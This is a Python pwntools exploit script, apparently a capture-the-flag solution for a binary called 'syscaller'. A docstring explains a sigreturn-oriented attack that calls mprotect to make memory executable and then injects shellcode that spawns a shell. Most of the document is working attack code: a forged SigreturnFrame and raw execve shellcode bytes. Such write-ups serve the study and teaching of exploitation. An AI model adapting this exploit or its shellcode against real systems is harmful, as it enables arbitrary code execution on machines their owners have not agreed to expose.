'''
The way this exploit works is:
the program execution proceeds from the start, prints msg1 in the first syscall, and comes to the second syscall (0x400118), and asks the user for input. 
Our script (the user) sends it values that will be popped to registers R12 - RDI (instructions at addresses 0x40011a to 0x400123; note that rax gets value 0xf which is required in order to run a sigreturn), and appends to that the sigreturn frame which will when the next syscall executes (at 0x400124) be placed from the stack (the sigreturn frame on the stack) into registers we specified in the sigreturn frame (RIP, RAX, RDI). Since RAX gets value 0xa from sigreturn frame (system call for changing permissions of data mapping segments), it will now (execution is on 0x400124 syscall) enter the syscall and with the values given in sigreturn frame execute a sys_mprotect system call which will change permissions of data region from 0x400000 to 0x401000 from r-w to rwx (read, write, execute), so that in the steps after this one the program can execute the shellcode we will put on the stack.
The permissions of the target memory region are now changed, and since in sigreturn frame we told the program to put 0x400104 into RIP and 0x40011a into RSP, the execution will go back to 0x400104, which will again run the code for taking input from the user. Now the exploit sends the shellcode to the program, and in 0x40010b the RSP value is placed into RSI register, meaning that user input will be placed on address 0x40011a which is a stack address where the first of the POP chain instructions is (0x40011a to 0x400123). This means that once the syscall at 0x400118 has now taken our user input (the shellcode placed at 0x40011a), the execution proceeds to the next instruction which is 0x40011a, but here there are no longer any POP instructions. Instead, the shellcode instructions are here and they will be executed, effectively running a shell for us. This is the goal of the exploit.
So this exploit is a clever way of using exploits to manipulate program execution and pop the shell.
'''

from pwn import *

target = process('./syscaller')
#gdb.attach(target, gdbscript='b *0x400104')

context.arch = 'amd64'

r12 = b"0" * 8
r11 = b"1" * 8
rdi = b"0" * 8
rax = p64(0xf)
rbx = b"0" * 8
rdx = b"1" * 8
rsi = b"0" * 8
rdi = b"1" * 8

# payload = ""
payload = r12
payload += r11
payload += rdi
payload += rax
payload += rbx
payload += rdx
payload += rsi
payload += rdi

frame = SigreturnFrame()

frame.rip = 0x400104
frame.rax = 0xa
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = 0x40011a

payload += bytes(frame)
target.sendline(payload)
raw_input()
shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
target.sendline(shellcode)
target.interactive()
